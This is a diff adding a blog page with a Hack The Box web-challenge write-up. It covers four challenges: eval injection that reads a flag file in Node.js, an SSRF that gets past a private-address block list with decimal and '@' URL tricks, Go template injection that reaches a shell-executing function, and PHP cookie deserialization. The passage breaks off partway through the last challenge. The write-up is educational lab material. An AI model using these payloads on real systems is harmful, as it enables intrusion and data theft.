@@ -1,0 +1,458 @@
+<!DOCTYPE html><html><head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  
+  
+  <title>  Ikonw Blog </title>
+
+ 
+  
+    <link rel="icon" href="/images/avatar.jpg">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png">
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          
+
+
+<div class="index slideDownMin">
+	
+
+	<div class="profile">
+
+		<img class="avatar" src="/images/avatar.jpg">
+
+		<p class="author">Ikonw</p>
+
+<div class="social">
+
+<a class="iconfont icon-Github" target="_blank" href="https://github.com/Ik0nw" title="Github">
+</a>
+
+<a class="iconfont icon-Telegram" target="_blank" href="https://t.me/ikonwwww" title="Telegram">
+</a>
+
+</div>
+	</div>
+
+
+	
+
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a class="title" href="/1998/01/01/HTB-Web-Challenge/">HTB Web Challenge</a>  
+	       
+		 
+
+		<div class="meta">
+			<time>Jan 01, 1998</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<h1 id="Jscalc-Easy"><a href="#Jscalc-Easy" class="headerlink" title="Jscalc - Easy"></a>Jscalc - Easy</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑</p>
+</blockquote>
+<p>Poking through the website found it uses <code>eval()</code>, in this case, it is vulnerable directly execute javascript codes</p>
+<p><img src="/images/HTB-Web-Challenge/image-20231211110203037.png"></p>
+<p>Take a look at routes, the <code>/api/calculate</code> accept variable called ‘<code>formula</code>‘ and passed it to the <code>calculatorHelp</code> calculator for processing</p>
+<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path       = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> router     = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Calculator</span> = <span class="built_in">require</span>(<span class="string">'../helpers/calculatorHelper'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">response</span> = data =&gt; ({ <span class="attr">message</span>: data });</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">'views/index.html'</span>));</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">'/api/calculate'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">	<span class="keyword">let</span> { formula } = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (formula) {</span><br><span class="line">		result = <span class="title class_">Calculator</span>.<span class="title function_">calculate</span>(formula);</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(result));</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Missing parameters'</span>));</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ocd</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>and it directly proceed with <code>eval</code> without sanitized the input</p>
+<figure class="highlight plaintext"><figcaption><span>js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">module.exports = {</span><br><span class="line">    calculate(formula) {</span><br><span class="line">        try {</span><br><span class="line">            return eval(`(function() { return ${ formula } ;}())`);</span><br><span class="line"></span><br><span class="line">        } catch (e) {</span><br><span class="line">            if (e instanceof SyntaxError) {</span><br><span class="line">                return 'Something went wrong!';</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://nodejs.org/en/learn/manipulating-files/reading-files-with-nodejs">Reading files with Node.js</a></p>
+<p><code>readFileSync</code> can be used to read files.</p>
+<p>craft payload in one line would be </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/HTB-Web-Challenge/image-20231211110904318.png"></p>
+<p>However it seems to return an object.</p>
+<p>Modify the parameter for readFileSync to <code>utf8</code></p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>,<span class="string">'utf8'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/HTB-Web-Challenge/image-20231211111035521.png"></p>
+<h1 id="ProxyAsService-Easy"><a href="#ProxyAsService-Easy" class="headerlink" title="ProxyAsService  - Easy"></a>ProxyAsService  - Easy</h1><p><strong>app.py</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">app.register_blueprint(proxy_api, url_prefix=<span class="string">'/'</span>)</span><br><span class="line">app.register_blueprint(debug, url_prefix=<span class="string">'/debug'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2 route blueprint <code>proxy_api</code> and <code>debug</code></p>
+<figure class="highlight elm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title">ip</span>:<span class="keyword">port</span>/(proxy_api)</span><br><span class="line">ip:<span class="keyword">port</span>/debug(debug)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>route.py</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> application.util <span class="keyword">import</span> is_from_localhost, proxy_req</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">SITE_NAME = <span class="string">'reddit.com'</span></span><br><span class="line"></span><br><span class="line">proxy_api = Blueprint(<span class="string">'proxy_api'</span>, __name__)</span><br><span class="line">debug     = Blueprint(<span class="string">'debug'</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">'/r/cats/'</span>,</span><br><span class="line">            <span class="string">'/r/catpictures'</span>,</span><br><span class="line">            <span class="string">'/r/catvideos/'</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'.proxy'</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f'http://<span class="subst">{SITE_NAME}</span><span class="subst">{url}</span>'</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br><span class="line"></span><br><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">'/environment'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = {</span><br><span class="line">        <span class="string">'Environment variables'</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">'Request headers'</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Break down into 2 parts.</p>
+<p>in the default index route, if the <code>url</code> parameter is not provided in the request, it will be randomly assign a path to <code>reddits</code>.</p>
+<p>If the <code>url</code> is set in parameter, it will access the url through the <code>proxy_req</code> function</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">'/r/cats/'</span>,</span><br><span class="line">            <span class="string">'/r/catpictures'</span>,</span><br><span class="line">            <span class="string">'/r/catvideos/'</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'.proxy'</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f'http://<span class="subst">{SITE_NAME}</span><span class="subst">{url}</span>'</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>utils.py</strong></p>
+<p>In this <code>utils.py</code> states the restriction for <code>proxy_req</code> functions stated previously, it will check if the <code>url</code> parameter contains the restricted keywords in the <code>RESTIRCTED_URLS</code> list. It will then act as a proxy send a request and forward the response back to user.</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">RESTRICTED_URLS = [<span class="string">'localhost'</span>, <span class="string">'127.'</span>, <span class="string">'192.168.'</span>, <span class="string">'10.'</span>, <span class="string">'172.'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> restricted_url <span class="keyword">in</span> RESTRICTED_URLS:</span><br><span class="line">        <span class="keyword">if</span> restricted_url <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">'127.0.0.1'</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_req</span>(<span class="params">url</span>):    </span><br><span class="line">    method = request.method</span><br><span class="line">    headers =  {</span><br><span class="line">        key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> request.headers <span class="keyword">if</span> key.lower() <span class="keyword">in</span> [<span class="string">'x-csrf-token'</span>, <span class="string">'cookie'</span>, <span class="string">'referer'</span>]</span><br><span class="line">    }</span><br><span class="line">    data = request.get_data()</span><br><span class="line"></span><br><span class="line">    response = requests.request(</span><br><span class="line">        method,</span><br><span class="line">        url,</span><br><span class="line">        headers=headers,</span><br><span class="line">        data=data,</span><br><span class="line">        verify=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_safe_url(url) <span class="keyword">or</span> <span class="keyword">not</span> is_safe_url(response.url):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> response, headers</span><br></pre></td></tr></tbody></table></figure>
+
+<p>From here, it clearly seems a <code>SSRF</code> challenge. But where is the flag?</p>
+<p>Checking through the docker files, the flag is hiding in the environment variable. Which we can obtain through the second part of the debug endpoints</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">'/environment'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = {</span><br><span class="line">        <span class="string">'Environment variables'</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">'Request headers'</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>It has to check if the request if is from localhost</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">'127.0.0.1'</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Now the task seems clearer, we have to craft a SSRF attacks, targeted to the <code>/debug/environment</code> and leak the environment settings that contains the flag.</p>
+<p>Firstly, we have to bypass the restriction of <code>RESTRICTED_LIST</code>, it can be easily bypass by using decimal to represent IP address. <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#localhost">Hacktrick</a> also provided other methods that represent <code>localhost</code></p>
+<p>Secondly, we cannot directly input the url point to endpoint as it will embedded a <code>reddit</code> infront of our provided user input.</p>
+<p>Therefore we can use @ to bypass that.</p>
+<p>Therefore the full payload will be </p>
+<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>The server side will interpreted as</p>
+<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=reddit<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>However, one interesting thing is when I setup docker in my localhost.</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211142253717.png" class="lazyload"></p>
+<p>I am able to get the flag through the payload indicate the port to be 1337 (Which docker itself exposed to 1337)</p>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.17.0.1:1337</span>/?url=@<span class="number">2130706433</span>:<span class="number">1337</span>/debug/environment</span><br></pre></td></tr></tbody></table></figure>
+
+<p>but to the real target, I have difficulties using the same port 32436.</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211142411053.png" class="lazyload"></p>
+<p>Suspect it is a mapping of ports when expose to public IPs.</p>
+<p>Therefore have to change the payload to port 1337</p>
+<figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/159.65.24.125:32436/</span><span class="string">?u</span>rl=<span class="variable">@0</span>.<span class="number">0.0</span>.<span class="number">0</span><span class="symbol">:</span><span class="number">1337</span>/debug/environment</span><br></pre></td></tr></tbody></table></figure>
+
+
+<h1 id="RenderQuest-Easy"><a href="#RenderQuest-Easy" class="headerlink" title="RenderQuest  - Easy"></a>RenderQuest  - Easy</h1><blockquote>
+<p>You’ve found a website that lets you input remote templates for rendering. Your task is to exploit this system’s vulnerabilities to access and retrieve a hidden flag. Good luck!</p>
+</blockquote>
+<p>From the description it seems like a Server Side Template Injection.</p>
+<p>In function <code>getTpl</code></p>
+<p>It retrieve the page and render the page using html template.</p>
+<p><a target="_blank" rel="noopener" href="https://pkg.go.dev/html/template">https://pkg.go.dev/html/template</a></p>
+<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p RequestData)</span></span> FetchServerInfo(command <span class="type">string</span>) <span class="type">string</span> {</span><br><span class="line">	out, err := exec.Command(<span class="string">"sh"</span>, <span class="string">"-c"</span>, command).Output()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		</span><br></pre></td></tr></tbody></table></figure>
+
+<p>This function is able to execute system information. Finding a way to trigger this function.</p>
+<p>It looks complicated, but we can always use chatGPT to spawn a sample html page with the go lang template.</p>
+<figure class="highlight handlebars"><table><tbody><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- File name: index.tpl --&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sample Template<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a sample GoLang HTML template page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- Here, you can include Go template syntax to render dynamic content --&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Client IP: </span><span class="template-variable">{{<span class="name">.ClientIP</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>User Agent: </span><span class="template-variable">{{<span class="name">.ClientUA</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Hostname: </span><span class="template-variable">{{<span class="name">.ServerInfo.Hostname</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server OS: </span><span class="template-variable">{{<span class="name">.ServerInfo.OS</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Kernel Version: </span><span class="template-variable">{{<span class="name">.ServerInfo.KernelVersion</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Memory: </span><span class="template-variable">{{<span class="name">.ServerInfo.Memory</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Location Information:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>IP Version: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.IpVersion</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>IP Address: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.IpAddress</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Latitude: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Latitude</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Longitude: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Longitude</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Country Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CountryName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Country Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CountryCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Time Zone: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.TimeZone</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Zip Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.ZipCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>City Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CityName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Region Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.RegionName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Continent: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Continent</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Continent Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.ContinentCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Using web hook, paste the html template into the response.</p>
+<p>Great we can render the page.</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224212844990.png" class="lazyload"></p>
+<p>Next we can just edit to call the <code>FetchServerInfo</code> </p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224223755102.png" class="lazyload"></p>
+<p>and we got the result</p>
+<figure class="highlight tap"><table><tbody><tr><td class="code"><pre><span class="line">total 10172</span><br><span class="line">drwxr-xr-x   <span class="number"> 1 </span>root     root         <span class="number"> 4096 </span>Dec<span class="number"> 17 </span>12:54 .</span><br><span class="line">drwxr-xr-x   <span class="number"> 1 </span>root     root         <span class="number"> 4096 </span>Dec<span class="number"> 17 </span>12:54 ..</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root         <span class="number"> 4786 </span>Sep<span class="number"> 11 </span>14:11 main.go</span><br><span class="line">-rwxr-xr-x   <span class="number"> 1 </span>root     root     <span class="number"> 10387927 </span>Dec<span class="number"> 17 </span>12:54 renderquest</span><br><span class="line">drwxr-xr-x   <span class="number"> 4 </span>root     root         <span class="number"> 4096 </span>Sep <span class="number"> 7 </span>23:12 static</span><br><span class="line">drwxr-xr-x   <span class="number"> 2 </span>root     root         <span class="number"> 4096 </span>Sep <span class="number"> 7 </span>23:12 templates</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224224419354.png" class="lazyload"></p>
+<h1 id="Toxic-Easy"><a href="#Toxic-Easy" class="headerlink" title="Toxic - Easy"></a>Toxic - Easy</h1><blockquote>
+<p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸</p>
+</blockquote>
+<p>In index.php</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">'PHPSESSID'</span>]))</span><br><span class="line">{</span><br><span class="line">    <span class="variable">$page</span> = <span class="keyword">new</span> <span class="title class_">PageModel</span>;</span><br><span class="line">    <span class="variable">$page</span>-&gt;file = <span class="string">'/www/index.html'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(</span><br><span class="line">        <span class="string">'PHPSESSID'</span>, </span><br><span class="line">        <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$page</span>)), </span><br><span class="line">        <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>, </span><br><span class="line">        <span class="string">'/'</span></span><br><span class="line">    );</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">'PHPSESSID'</span>]);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>The page is deserialize the cookie to render the page.</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231231204239161.png" class="lazyload"></p>
+<p>The url file page being render is being indicate in the file attribute.</p>
+<p>Below is the breakdown of the seralized object </p>
